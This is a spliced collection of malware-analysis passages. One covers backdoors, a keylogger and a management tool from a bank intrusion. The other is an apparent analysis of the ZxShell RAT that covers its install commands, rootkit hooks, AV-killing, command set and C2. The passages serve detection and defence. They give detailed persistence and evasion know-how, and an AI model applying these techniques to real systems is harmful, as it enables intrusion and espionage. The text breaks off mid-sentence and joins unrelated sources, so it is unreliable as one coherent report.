This matches the description of backdoors from the Romeo set as per Novetta . Malware 7: Passive Backdoors MD5: b9be8d53542f5b4abad4687a891b1c03 Type: PE32 executable (GUI) Intel 80386, for MS Windows Size: 102\\'400 bytes Names: hkcmd.exe Internal n ame: compact.exe Link t ime: 2016.01.08 16:41:18 (GMT) Linker version: 6.0 Product name (file version info): Windows Firewall Remote Management Used in: Incident #1 This executable was written using the Microsoft MFC framework. The application is designed to run as a service , however it can also start and work as a standalone non - service process . I t registers with the name of \"helpsvcs\". The code is organized in classes, one of which, the main application class, has a static text variable set to \"PVS\", which seems to be unused in the code. This service relies on command line argument s passed as an integer defining the port number that it will listen to in the future. This is a reduced minimalistic way of configur ing and us ing the backdoor in listening mode, however there is a c lass that is responsible for loading or saving full configuration block from/to the registry. The registry value used to store the configuration depends on the parameter value (%parameter%) passed to the function. The registry configuration is located at HKCR \\\\ NR%parameter% \\\\ Content Setting. The m ain service procedure generates a unique instance ID which is set to pseudo - randomly selected 8 bytes. Some previous version s of the code relied on some pseudo - random value s derived from the current time and MAC ad dresses of available network cards, but then was changed to a hardware independent value. This backdoor takes care of enabling port s in the Windows Firewall by creating a new firewall rule named \"Windows Firewall Remote Management\" using netsh.exe tool on Windows, which enables an incoming connection to any executable on the TCP port that is currently used by the backdoor. In case this rule has different name in other samples, it\\'s quite easy to find it , because it doesn\\'t specify which group of rules it b elongs to, unlike all other default Windows Firewall rules. Sorting Firewall r ules by group name may quickly reveal such an odd rule: The backdoor provides process and file management, as well as the creation of TCP connection relays. Another backdoor based on the same code was found in the same bank, however it was made as a standalone executable instead of a DLL.

This module contains a small embedded executable in the data section , encrypted with a trivial (xor 0xb1, add 0x4f) method. The MZ header is wiped from that embedded file and is restored during decryption routine. Some other properties of the small embedded file are listed below (MD5: 8387ceba0c020a650e 1add75d24967f2). This executable module is used to force unloading a DLL from memory.

H owever, it is registered as a service and gets an RC4 key and the payload from the registry values of its own service. The name of the service is not fixed and is probably set during installation stage . Here is the registry value path for the RC4 key and encrypted payload respectively: HKLM \\\\ SYSTEM \\\\ CurrentControlSet \\\\ Services \\\\ %SERVICENAME% \\\\ Security \\\\ Data2 HKLM \\\\ SYSTEM \\\\ CurrentControlSet \\\\ Services \\\\ %SERVICENAME% \\\\ Security \\\\ Data0 The code gets the 16 - bytes RC4 key from the registry ( f9 65 8b c9 ec 12 f 9 ae 50 e6 26 d7 70 77 ac 1e ) and encrypted payload, decrypts the payload with that key and then decrypts it one more time with the following hardcoded key (previously seen in the backdoor management tool): 53 87 F2 11 30 3D B5 52 AD C8 28 09 E0 52 60 D0 6 C C5 68 E2 70 77 3C 8F 12 C0 7B 13 D7 B3 9F 15 The final decrypted payload is loaded and started as a DLL in memory. At the time of analysis the attackers managed to wipe the payload in the registry with a benign system file data, so only the RC4 key rema ined untouched and was found in the registry. Malware 10: Keylogger MD5: 5ebfe9a9ab9c2c4b200508ae5d91f067 Known f ilenames: NCVlan.dat File size: 73\\'216 bytes Type: PE32+ executable (DLL) (GUI) x86 - 64, for MS Windows Link time: 2016.04.06 07:38:57 (GMT) Lin ker version: 10.0 Original name: grep.dll Used in: Incident #1 This module is a user - mode keylogger. It contains an export function with an empty name, which has the main functionality of the module. Upon start ing it creates a new thread, which suggests that it has to be loaded by a custom PE loader (probably by the DLL Injector described in this paper, MD5: 949e1e35e09b25fca3927d3878d72bf4). The main thread registers a new class named \"Shell TrayCls%RANDOM%\", wher e %RANDOM% value is an integer returned by the system rand function seeded with the current system time. Next , it creates a window called \"Shell Tray%RANDOM%\". The new window registers a system - wide keyboard hook and starts recording keypresses and Unicode text in context of the clipboard. The data is saved into a current user profile directory in a file that is named after the username via the following template string: NTUSER{%USERNAME%}.TxS.blf . F or example , the full path that we discovered was \"C: \\\\ User s \\\\ [redacted] \\\\ NTUSER.DAT{[redacted operator ]}.TxS.blf\". The data written in the file is encrypted with RC4 with the following hardcoded 64 - bytes key: 53 55 4D A2 30 55 53 44 30 2C 30 3E 27 44 42 54 20 4C 49 4D 49 54 43 55 53 44 30 2C 0D 0A 43 44 54 19 53 55 4D 7F 31 55 53 44 32 36 35 2C 30 E4 37 43 44 54 98 4C 49 4D 49 54 1B 55 53 44 30 2C The RC4 key is not entirely random and seems to contain chunks of readable ASCII text related to some database contents or quer ies : \" SUM.0USD0,0>\\'DBT LIMITCUSD0, ..CDT.SUM.1USD265,0.7CDT.LIMIT.USD0, \" We assume this is done to complicate the recognition of a password - like string by eye , or use a value that would cause some false - positives when scanning for such a pattern. The keylogger data file is a binary log that contains sequences of records organized in blocks which have the following events inside: 1. Session Start (Logon): Contains username, type of session (rdp, console, etc), session id. 2. Session Activity: Contains active windows name and sequence of typed keys. 3. Session End (Logoff): Contains username, session id. Every event record contains a DWORD timestamp. The module also starts a watchdog thread that keeps monitoring the creation of a trigger - file called ODBCREP.HLP in the di rectory of the current DLL. If such file is found , the keylogger removes the keyboard hook and unloads from the process immediately.

The dropper command line takes the following: gpsvc.exe - e %name% - drop payload on disk gpsvc.exe - l - lists all registered services under netsvcs registry key 3 . gpsvc.exe - a %param2% %param3% - registers a news se rvice using %param2% as the service name and %param3% as the path to DLL file of service binary. If the %param3% doesn\\'t contain \" \\\\ \" character, the code uses it as the filename in %SYSTEMROOT% \\\\ System32 \\\\ . 3 HKLM \\\\ Software \\\\ Microsoft \\\\ Windows NT \\\\ CurrentVersion \\\\ Svchost \\\\ netsvcs When - e option is used, the files stored in the cont ainers are extracted, decrypted where encryption is used , and dropped to a disk in two locations: one goes to the current directory as %name% , another is saved into %SYSTEMROOT% \\\\ Help \\\\ %name%.chm . The value of the %name% parameter is passed via command line argument. The container starts with a 40 bytes header describing the start of the payload, container and the payload data inside. The data may or may not be encrypted and there is no specific flag identifying that in container itself. The code processing the container will know whether the container\\'s payload requires decryption. Upon successful extraction of the files , the dropper will show the following message on the command line: Fig. Report of successful payload deployment. The first extracted file is decrypted using the following key and Spritz algorithm, a variant of the RC4 family: 95 B4 08 68 E4 8B 72 94 5E 61 60 BF 3F D7 F9 41 10 9A 4A C4 66 41 99 48 CC 79 F5 6A FE 5F 12 E5 The second file is extracted as - is, however, b rief analysis of its header suggested that it is encrypted with the same crypto and key.

The list of commands to run is located in the following file path (let\\'s call it source file): C: \\\\ Windows \\\\ Temp \\\\ TMP298.tmp. Once the comma nds are executed , it sleeps for one second and starts the process again until the source file contains a line with just one word in it: \"die\". This batch file opens and runs every command mentioned in the .tmp file and saves the output to C: \\\\ Windows \\\\ Temp \\\\ TMP298.tmp.ret. Once it finds the word \"die\" in the source, it deletes the source and the output file and quit s. H owever , this batch file is either broken or implemented with a bug. Note the line \"goto end\" and no label called \":end\" in the batch file. We can only speculate how this file was used in the real attack, but one theory looks to be the most probable: it was used as an awkward way to execute commands with SYSTEM user privileges. While it is possible to run commands as a SYSTEM user when you hav e administrative privileges on a target machine, getting a n interactive shell requires more work. A batch file like this could run in the background, quietly spawning cmd.exe in a loop and non - resource exhausting mode. Passing commands to the source file w ould allow attackers to conveniently execute them the next second and get the output via another text file. This infinite loop could be easily broken with the \"die\" keyword. So far, we believe that this file could serve as a privilege escalation trampoline for other unprivileged processes ( such as usermode backdoor). Malware 14. Backdoor Management Tool Filename: gpsvc.exe MD5: 85d316590edfb4212049c4490db08c4b SHA1: 4f0d7a33d23d53c0eb8b34d102cdd660fc5323a2 File Size: 753664 bytes File Type: PE32 executable (console) Intel 80386, for MS Windows Link Time: 2015.08.24 10:21:52 (GMT) Linker version: 8.0 This module is a commandline tool that helps to install a new service. In addition it is capable of doing code injection and work s as a service itself. The bin ary is protected with Enigma Protector. If the module is started without commandline arguments, it quits immediately. Depending on commandline options passed the tool may work in different modes. 1. Service Enumeration Mode Commandline: gpsvc.exe - l This mode is selected with commandline option - v. In this case the module get a list of services from hardcoded registry value HKLM \\\\ SOFTWARE \\\\ Microsoft \\\\ Windows NT \\\\ CurrentVersion \\\\ svchost \\\\ netsvcs . This value is a present on clean Windows installation and usua lly contains a list of standard service names that may generate some network activity. The code iterates through available services and prints to standard output every service it managed to open with read privileges (used just to confirm that the service i s running). After this the tool exits. 2. Service Activation Mode Commandline: gpsvc.exe - s %param1% %param2% In this mode the module registers and starts a new service if it doesn\\'t exist. The service name is based on the current executable filename. The fo llowing commandline is stored in the registry to start the service: \" %self_path% \" - k %param1% %param2% Where %self_path% is full path to current executable and %param1%, %param2% are passed as - is from current commandline. 3. File Payload Deployment Commandline: gpsvc.exe - e %param1% %param2% In this mode the module extracts and stores additional executable on the filesystem (filepath is inside installation cryptocontainer). It uses %param2% to open the file as a cryptocontainer. Cryptocontainer is e ncrypted with two RC4 keys: A. KeyA which is 16 bytes of MD5 value from a string which is passed via %param1% B. KeyB is a hardcoded 32 - byte binary value: 53 87 F2 11 30 3D B5 52 AD C8 28 09 E0 52 60 D0 6C C5 68 E2 70 77 3C 8F 12 C0 7B 13 D7 B3 9F 15 It contain s payload data to be installed into registry and some paths. 4. Registry Payload Deployment Commandline: gpsvc.exe - f %param1% %param2% This mode is very similar to \" File Payload Deployment \" described above, but in this case the module is instructed to ins tall the payload into the registry value. 5. Service Test Commandline: gpsvc.exe - o %param1% This mode is used to ensure that the service is running correctly by checking that a special event object named %param1% exists. 6. Service Termination Commandline : gpsvc.exe - t %param1% This mode is used signal the running service via special event object named %param1% to terminate execution. 7. Payload Injection Mode Commandline: gpsvc.exe - k %param1% %param2% In this mode the module assumes that it can be a service binary, so it tries to behave as service. If it fails it falls back to regular standalone executable mode. Main purpose of this code is to find payload in the registry, decrypt it and inject into target process memory. The payload is stored in the following registry value: HKLM \\\\ SYSTEM \\\\ CurrentControlSet \\\\ services \\\\ %servicename% \\\\ Security \\\\ Data2 It is encrypted with RC4, and key is taken from the registry using the following binary value (16 bytes): HKLM \\\\ SYSTEM \\\\ CurrentControlSet \\\\ services \\\\ %servicename% \\\\ Sec urity \\\\ Data3 . The cryptocontainer used by this module contains a magic value after it\\'s decrypted with MD5 of the secret passed via commandline and hardcoded RC4 key. At offset 4 it has to contain the following DWORD: 0xBC0F1DAD (AD 1D 0F BC).

The primary attack vectors are watering-hole, spear phishing, and other web-based attacks.\\nFrequently, a remote administration tool (RAT) is used to maintain persistence within a victim’s organization. These tools are used to further compromise the organization by attacking other hosts inside the targets network.\\nZxShell (aka Sensocode) is a Remote Administration Tool (RAT) used by Group 72 to conduct cyber-espionage operations. Once the RAT is installed on the host it will be used to administer the client, exfiltrate data, or leverage the client as a pivot to attack an organization’s internal infrastructure.\\xa0 Here is a short list of the types of tools included with ZxShell:\\nKeylogger (used to capture passwords and other interesting data)\\nCommand line shell for remote administration\\nRemote desktop\\nVarious network attack tools used to fingerprint and compromise other hosts on the network\\nLocal user account creation tools\\nFor a complete list of tools please see the MainConnectionIo section.\\nThe following paper is a technical analysis on the functionality of ZxShell. The analysts involved were able to identify command and control (C2) servers, dropper and installation methods, means of persistence, and identify the attack tools that are core to the RAT’s purpose. In addition, the researchers used their analysis to provide detection coverage for Snort, Fireamp, and ClamAV.\\nTable of Contents\\nBackground\\nDistribution and Delivery\\nAnalysis of the main ZxShell module\\nDllMain\\nInstall\\nServiceMain\\nShellMain\\nShellMainThread\\nGetIpListAndConnect\\nMainConnectionIo\\nUninstall\\nZxFunction001\\nZxFunction002\\nCommand and Control server\\nMalware Package\\nVersion Information\\nExtracted URL Analysis\\nConclusion\\nProtecting Users From These Threats\\nAppendix A: Snort rules\\nAppendix B: ClamAV signatures\\nAppendix C: List of Memory Offsets for Some ZxShell Functions\\nAppendix D: Other Collateral\\nBackground\\nZxShell has been around since 2004. There are a lot of versions available in the underground market. We have analyzed the most common version of ZxShell, version 3.10. There are newer versions, up to version 3.39 as of October 2014.\\nDistribution and Delivery\\nAn individual who goes by the name LZX in some online forums is believed to be the original author of ZxShell. Since ZxShell has been around since at least 2004, numerous people have purchased or obtained the tools necessary to set up ZxShell command and control servers (C&C) and generate the malware that is placed on the victim’s network. ZxShell has been observed to be distributed through phishing attacks, dropped by exploits that leverage vulnerabilities such as CVE-2011-2462, CVE-2013-3163, and CVE-2014-0322.\\nAnalysis of the Main ZxShell Module\\nTo illustrate the functionality of main ZxShell module, Let’s take a look at the following sample:\\nMD5: e3878d541d17b156b7ca447eeb49d96a\\nSHA256: 1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c\\nIt exports the following functions, which are examined in greater detail below:\\nDllMain\\nInstall\\nUnInstall\\nServiceMain\\nShellMain\\nShellMainThread\\nzxFunction001\\nzxFunction002\\nDllMain\\nDllMain performs the initialization of ZxShell. It allocates a buffer of 0x2800 bytes and copies the code for the ZxGetLibAndProcAddr function. To copy memory, the memcpy function is invoked. It is not directly used from msvcrt.dll but is instead copied to another memory chunk before being called. Finally, the trojan Import Address Table (IAT) is resolved and the file path of the process that hosts the dll is resolved and saved in a global variable.\\nInstall\\nZxShell.dll is injected in a shared SVCHOST process. The Svchost group registry key HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SvcHost is opened and the netsvc group value data is queried to generate a name for the service.\\nBefore the malware can be installed a unique name must to be generated for the service. The malware accomplishes this through querying the netsvc group value data located in the svchost group registry key which is HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SvcHost.\\nAt startup, Svchost.exe checks the services part of the registry and constructs a list of services to load. Each Svchost session can contain multiple shared services that are organized in groups. Therefore, separate services can run, depending on how and where Svchost.exe is started.\\nImage 1. Svchost Groups registry key\\nSvchost.exe groups are identified in the above registry key. Each value under this key represents a separate Svchost group and appears as a separate instance when you are viewing active processes. Each value is a REG_MULTI_SZ value and contains the services that run under that Svchost group. Each Svchost group can contain one or more service names that are extracted from the following registry key, whose Parameters key contains a ServiceDLL value:\\nHKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet\\\\Services\\\\Service\\nOn a Windows machine, the netsvc group contains names of both existing and non-existing services. ZxShell exploits this fact by cycling between each of the names, verifying the existence of the real service. The service’s existence is verified with the ServiceExists function, which attempts to open the relative registry sub-key in HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services. The first service name that is not installed on the system becomes the ZxShell service name.\\nA new service is then created using the service parser function ProcessScCommand. ZxShell implemented its own version of the Windows SC command. There are minor differences between the ZxShell implementation of this command and the original Windows one, but they are irrelevant for the purpose of the analysis The command used to install the service is:\\nsc create <service name> <service name> “%SystemRoot%\\\\System32\\\\svchost.exe -k netsvcs”\\nwhere <service name> is the chosen infected service name.\\nImage 2. “SC” command used to create the target service,and parsed by “ProcessScCommand” routine\\nThe installed service registry key is opened and the 2 values under its Parameter subkey are created. These 2 values, ServiceDll and ServiceDllUnloadOnStop are needed for services that run in a shared process.\\nBefore the service is started ChangeServiceConfig is called to modify the service type to shared and interactive. If the service fails to start then a random service name formatted as netsvc_xxxxxxxx, where xxxxxxxx represent an 8-digit random hex value, is added to the netsvc group and the entire function is repeated.\\nServiceMain\\nThis function is the entry point of the service. It registers the service using the RegisterServiceCtrlHandler Windows API function. The ZxShell service handler routine is only a stub: it responds to each service request code, doing nothing, and finally exits. It sets the service status to RUNNING and finally calls the ShellMain function of ZxShell.\\nShellMain\\nThe ShellMain function is a stub that relocates the DLL to another buffer and spawns a thread that starts from ShellMainThreadInt at offset +0xC0CD. The ShellMainThreadInt function gets the HeapDestroy Windows API address and replaces the first 3 bytes with the RET 4 opcode. Subsequently, it calls the FreeLibrary function to free its own DLL buffer located at its original address. Because of this, the allocated heaps will not be freed. It re-copies the DLL from the new buffer to the original one using the memcpy function. Finally, it spawns the main thread that starts at the original location of ShellMainThread procedure, and terminates. At this point, the ZxShell library is no longer linked in the module list of the host process. This is important because if any system tool tries to open the host process it will never display the ZxShell DLL.\\nShellMainThread\\nThis thread implements the main code, responsible for the entire botnet DLL.\\nFirst, it checks if the DLL is executed as a service. If so, it spawns the service watchdog thread. The watchdog thread checks the registry path of the ZxShell service every 2 seconds, to verify that it hasn’t been modified. If a user or an application modifies the ZxShell service registry key, the code restores the original infected service key and values.\\nImage 3. The watchdog thread of ZxShell service\\nThe buffer containing the ZxShell Dll in the new location is freed using the VirtualFree API function. A handle to the DLL file is taken in order to make its deletion more difficult. The ZxShell mutex is created named @_ZXSHELL_@.\\nZxShell plugins are parsed and loaded with the AnalyseAndLoadPlugins function. The plugin registry key HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\zxplug is opened and each value is queried. The registry value contains the plugin file name. The target file is loaded using the LoadLibrary API function, and the address of the exported function zxMain is obtained with GetProcAddress.\\nIf the target filename is incorrect or invalid the plugin file is deleted and the registry value is erased. That is performed by the function DeleteAndLogPlugin. Otherwise, the plugin is added to an internal list. Here is the data structure used to keep track of the plugins:\\ntypedef struct _ZX_PLUGINS_STRUCT {\\nLPSTR lpStrRegKey;\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0 // + 0x00 - ZxShell Plugins registry key string\\n// (like 'SYSTEM\\\\CurrentControlSet\\\\Control\\\\zxplug')\\nDWORD dwUnknown2;\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0 // + 0x04 - Unknown DWORD value\\nLPVOID lp138hBuff;\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0 // + 0x08 - Plugins list\\nDWORD dwZero;\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0 // + 0x0C - Always zero\\nHANDLE hReg;\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0 // + 0x10 - Handle to plugin registry key\\n} ZX_PLUGINS_STRUCT, *PZX_PLUGINS_STRUCT;\\nThe thread KeyloggerThread is spawned and is responsible for doing keylogging on the target workstation. We will take a look at the keylogger later on. Finally the main network communication function GetIpListAndConnect is called.\\nGetIpListAndConnect\\nThis function is at the core of the RAT’s network communication. It starts by initializing a random number generator and reading 100 bytes inside the ZxShell Dll at a hardcoded location. These bytes are XOR encrypted with the byte-key 0x85 and contains a list of remote hosts where to connect. The data is decrypted, the remote host list is parsed and verified using the BuildTargetIpListStruct function. There are 3 types of lists recognized by ZxShell: plain ip addresses, HTTP and FTP addresses.\\nIf the list does not contain any item, or if the verification has failed, the ZxShell sample tries to connect to a hardcoded host\\xa0 with the goal of retrieving a new updated list.\\nOtherwise, ZxShell tries to connect to the first item of the list. If ZxShell successfully connects to the remote host, the function DoHandshake is called. This function implements the initial handshake which consists of exchanging 16 bytes, 0x00001985 and 0x00000425,\\xa0 with the server. The function GetLocalPcDescrStr is used to compose a large string that contains system information of the target workstation. That information is the following:\\nlocal hostname\\norganization\\nowner\\noperating system details\\nCPU speed\\ntotal physical memory\\nThe string is sent to the remote host and the response is checked to see if the first byte of the response is 0xF4, an arbitrary byte. If it is, the botnet connection I/O procedure is called through the MainConnectionIo function.\\nImage 4. The GetLocalPcDescrStr and DoHandshake functions called beforestarting the command processing\\nOtherwise, the ZxShell code closes the socket used and sleeps for 30 seconds. It will then retry the connection with the next remote host, if there is one.\\nIt is noteworthy that this function includes the code to set the ZxShell node as a server: if one of the hardcoded boolean value is set to 1, a listening socket is created. The code waits for an incoming connection. When the connection is established a new thread is spawned that starts with the MainConnectionIo function.\\nMainConnectionIo\\nThe MainConnectionIo function checks if the Windows Firewall is enabled, sets the Tcp Keep Alive value and Non-blocking mode connection options and receives data from the remote host through the ReceiveCommandData function. If the communication fails, ZxShell disables the firewall by modifying the registry key:\\nHKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\StandardProfile\\nThen the connection is retried. The received command is then processed by the ZxShell function with the ProcessCommand function.\\nThe command processing function starts by substituting the main module name and path in the hosting process PEB, with the one of the default internet browser. The path of the main browser of the workstation is obtained by reading the registry value:\\nHKLM\\\\SOFTWARE\\\\Classes\\\\HTTP\\\\shell\\\\open\\\\command\\nImage 5. Our test workstation use Windows Internet Explorer as default browser\\nThis trick renders identification by firewall more cumbersome. A host firewall\\xa0 will recognize the outgoing connection as originated by the browser instead of the ZxShell service host process. The browser process always performs outgoing connections and the firewall shouldn’t block them.\\nThe command processing is straightforward. Here is the list of common commands:\\nCOMMAND\\nMEANING\\nHelp / ?\\nGet help\\nExit / Quit\\nExit and shut down the botnet client\\nSysInfo\\nGet target System information\\nSYNFlood\\nPerform a SYN attack on a host\\nPs\\nProcess service Unix command implementation\\nCleanEvent\\nClear System Event log\\nFindPass\\nFind login account password\\nFileTime\\nGet time information about a file\\nFindDialPass\\nList all the dial-up accounts and passwords\\nUser\\nAccount Management System\\nTransFile\\nTransfer file in or from remote host\\nExecute\\nRun a program in the remote host\\nSC\\nService control command, implemented as the Windows one\\nCA\\nClone user account\\nRunAs\\nCreate new process as another User or Process context.\\nTermSvc\\nTerminal service configuration (working on Win Xp/2003)\\nGetCMD\\nRemote Shell\\nShutdown\\nLogout, shutdown or restart the target system\\nZXARPS\\nSpoofing, redirection, packet capture\\nZXNC\\nRun ZXNC v1.1 – a simple telnet client\\nZXHttpProxy\\nRun a HTTP proxy server on the workstation\\nZXSockProxy\\nRun a Sock 4 & 5 Proxy server\\nZXHttpServer\\nRun a custom HTTP server\\nPortScan\\nRun TCP Port MultiScanner v1.0\\nKeyLog\\nCapture or record the remote computer’s keystrokes. The implementation is a userland keylogger that polls the keymap with each keystroke.\\nLoadDll\\nLoad a DLL into the specified process\\nEnd\\nTerminate ZxShell DLL\\nUninstall\\nUninstall and terminate ZxShell bot DLL\\nShareShell\\nShare a shell to other\\nCloseFW\\nSwitch off Windows Firewall\\nFileMG\\nFile Manager\\nwinvnc\\nRemote Desktop\\nrPortMap\\nPort Forwarding\\ncapsrv\\nVideo Device Spying\\nzxplug\\nAdd and load a ZxShell custom plugin\\nThis set of functionality allows the operator complete control of a system. Being able to transfer and execute files on the infected system means the attacker can run any code they please. Further, the keylogging and remote desktop functionality allows the operator to spy on the infected machine, observing all keystrokes and viewing all user actions.\\nUninstall\\nUnloads ZxShell and deletes all of the active components. This simply deletes the ZxShell service key from the Windows registry (using SHDeleteKey Api) and all of the subkeys. Finally, it marks ZxShell main Dll for deletion with the MoveFileEx Windows API.\\nZxFunction001\\nThis function is the supporting functionality for WinVNC. To allow the VNC session to connect, the current network socket WSAProtcol_Info structure is written to a named pipe prior to calling zxFunction001. Once the named pipe has been created, CreateProcessAsUserA is called with the following as the CommandLine parameter :\\n<systemroot>\\\\\\\\rundll32.exe <zxshell dll name>,zxFunction001 <name of NamedPipe>\\nzxFunction001 modifies the current process memory, uses data contained in the named pipe to create a socket, and then executes the code that sends the remote desktop session to the server controller.\\nZxFunction002\\nThis function will either bind the calling process to a port or has the calling process connect to a remote host. The function is called in the following manner:\\n<systemroot>\\\\\\\\rundll32.exe <zxshell dll name>,zxFunction002 <name of NamedPipe>\\nThe functionality (connect or bind) depends on the data contained within the named pipe. Unlike zxFunction001, this is not used by\\xa0 any of the RAT commands in the zxshell.dll.\\nKernel Device Driver LoveUSD\\nApart from user-mode ZxShell droppers mentioned earlier, there is a file (SHA256: 1e200d0d3de360d9c32e30d4c98f07e100f6260a86a817943a8fb06995c15335) that installs a kernel device driver called loveusd.sys. The architecture of this dropper is different from the others: it starts extracting the main driver from itself. It adds the SeLoadDriver privilege to its access token and proceeds to install the driver as a fake disk filter driver. ZxShell opens the registry key that describes the disk class drivers:\\nSYSTEM\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E967-E325-11CE-BFC1-08002BE10318}\\nIt then adds the “Loveusd.sys” extracted driver name to the upper filter list. In our analysed sample the “Loveusd.sys” driver is installed with the name “USBHPMS”. Finally the driver is started using the ZwLoadDriver native API.\\nThe ZxShell driver starts by acquiring some kernel information and then hooking “ObReferenceObjectByHandle” API. Finally it spawns 2 system threads.\\nThe first thread is the “communication” thread. ZxShell employs a strange method for communication: it hooks the NtWriteFile API and recognizes 5 different special handle values as commands:\\n0x111111111 – Hide “Loveusd” driver from the system kernel driver list\\n0x22222222 – Securely delete an in-use or no-access target file-name\\n0x44444444 – Unhook the ZwWriteFile API and hook KiFastCallEntry\\n0x55555555 – Remove the ZxShell Image Load Notify routine\\n0x88888888 – Set a special value called “type” in Windows registry key HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\DriverMain\\nThe second Loveusd system thread does a lot of things. Its principal duties are to create the ZxShell main DLL in “c:\\\\Windows\\\\System32\\\\commhlp32.dll” and to install the Kernel “Load Image Notify routine”. The code then tries to kill each process and service that belongs to the following list of AV products:\\nSymantec Firewall\\nNorton\\nESET\\nMcAfee\\nAvast\\nAvira\\nSophos\\nMalwarebytes\\nNext, the ZxShell Load-Image Notify function prevents the AV processes from restarting.\\nThe installation procedure continues in the user-mode dropper. The ZxShell service is installed as usual, and the in-execution dropper is deleted permanently using the special handle value 0x22222222 for the WriteFile API call. This handle value is invalid: all the windows kernel handle values are by design a multiple of 4. The ZxShell hook code knows that and intercept it.\\nObReferenceObjectByHandle is a Kernel routine designed to validate a target object and return the pointer to its object body (and even its handle information), starting from the object handle (even the user-mode one). The hook installed by ZxShell implements one of its filtering routine. It filters each attempt to open the ZxShell protected driver or the main DLL, returning a reference to the “netstat.exe” file. The protection is enabled to all processes except for ones in the following list: Svchost.exe, Lsass.exe, Winlogon.exe, Services.exe, Csrss.exe, ctfmon.exe, Rundll32.exe, mpnotify.exe, update.exe.\\nIf the type of the object that the system is trying to validate is a process, the hook code rewrites again the configuration data of the ZxShell service in the windows registry.\\nImage 6. Our test Windows XP workstation trying to open the sys file of ZxShell LOVEUSD driver\\nThe last type of Kernel modification that ZxShell rootkit performs is the system call dispatcher (KiFastCallEntry) hook. In this manner, ZxShell is able to completely hide itself, intercepting the following Kernel API calls: ZwAllocateVirtualMemory, ZwOpenEvent, ZwQueryDirectoryFile, ZwWriteFile, ZwEnumerateKey, and ZwDeviceIoControlFile.\\nCommand and Control Server\\nSample (SHA256: 1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c) is configured to act as a server. The symbol “g_bCreateListenSck” is set to 1. This means that, as seen above, the ZxShell Dll is started in listening mode. It connects to the first remote C&C that tries to contact it and succeeds in the handshake. The encrypted IP address is “127.0.0.2” (used as loopback) and no connection is made on that IP address (due to the listening variable set to 1).\\nMalware Package\\nWe used the ZxShell package for version 3.10 (SHA256: 1622460afbc8a255141256cb77af61c670ec21291df8fe0989c37852b59422b4).The convenient thing about this is that the CNC panel worked with any version, 3.10 and above. The buttons are all in Chinese, with the help of Google Translate and keen detective skills (read: button clicking), we’ve deciphered the functionality.\\nWhen you start the controller, you need to set the port you want to listen on and if you’ve set a password, add it here.\\nOnce an infected machine connects, you see its information displayed in a selection box at the top. There are some built in functions on the side for the more common features. These include remote desktop, webcam spying, remote shell, and file management. You can also select a host and type help for a full list of commands.\\nI have the same machine infected with two different version of ZxShell. Sending the help command for each, you can see the extra features added between version 3.1 and 3.2.\\nKeylogging, ZXARPS (IP and URL spoofing), and SYNFlood are some of the interesting features added to version 3.2.\\nVersion Information\\nWe wrote a script to extract version info from the binaries we have.\\n3.100 : 914\\n3.200 : 152\\n3.210 : 118\\n3.220 : 14\\n3.390 : 3\\nIn versions 3.1 – 3.21, the configuration info is xor encoded with 0x85. This configuration info can be changed with a tool included in the ZxShell package.\\nIn versions 3.22 and 3.39 the routine changes. The new xor encoding byte is 0x5B. The data is stored in the last 0x100 bytes of the file. The first 8 bytes of data are static. Then there is the dll install name, the domain, and the port.\\nExtracted URL Analysis\\nKnowing the obfuscation routines for this data we wrote a script to extract the URLs / IPs and ports stored.\\nThe most common ports used are, 80, 1985, 1986, and 443. 1985 is the default port for the malware, 1986 is the lazy variation of that port. Port 80 and 443 are the default ports for HTTP and HTTPS traffic. The next most common is port 53. This is used in some of the newer 3.22 and 3.39 samples. After that, the count for each port starts declining sharply. The choices are interesting though, many correspond to what looks like the birth year of the controller (ie. years in the late 1980s and early 1990s), and others seem to match what year the malware was launched in (ie. in the 2000s, relatively close to the current year).\\nSince this malware dates back to around 2004, there are many samples containing CNC URLs from the 3322.org page. This page used to offer no-ip type hosting and was widely used by malware authors. So much so that Microsoft did a takedown in 2012. A similar service, vicp.net, is also seen in many of the domains.\\nIn the malware, if a domain is configured, it will retrieve domain.tld/myip.txt. This file contains a list of IP addresses for the infected machine to connect back to. Otherwise, if an IP address is configured, it will connect directly to that IP address.\\nCloning the ZxShell Server\\nWe have written a simple C++ ZxShell Server that implements the communication and the handshake for the version 3.10 and 3.20 of the ZxShell DLL. The implementation is quite simple: After the handshake, 2 threads that deal with data transfer are spawned. Here we have some screenshots that show the Server and the ZxShell Keylogger in action:\\nOur server has accepted a connection from a remote host\\nThe ZxShell keylogger has captured 2 user passwords(gmail.com and amazon.com)\\nThe last image shows a very interesting feature of the ZxShell keylogger: once installed and activated, the keylogger is able to catch each password that the user inserts in the login box of each website (like Google, Amazon and so on…). This makes the keylogger a perfect weapons for the attackers. They will be able to steal and resell in the underground market the sensitive data of each victim.\\nConclusion\\nAdvanced persistent threats will remain a problem for companies and organizations of all sizes, especially those with high financial or intellectual property value.\\xa0 Group 72’s involvement in Operation SMN is another example of what sort of damage that can be done if organizations are not diligent in their efforts to secure their networks.\\xa0 ZxShell is one sample amongst several tools that Group 72 used within their campaign.\\nZxShell is a sophisticated tool employed by Group 72 that contains all kinds of functionality.\\xa0 Its detection and removal can be difficult due to the various techniques used to conceal its presence, such as disabling the host anti-virus, masking its installation on a system with a valid service name, and by masking outbound traffic as originating from a web browser.\\xa0 While other techniques are also utilized to conceal and inhibit its removal, ZxShell’s primary functionality is to act as a Remote Administration Tool (RAT), allowing the threat actor to have continuous backdoor access on to the compromised 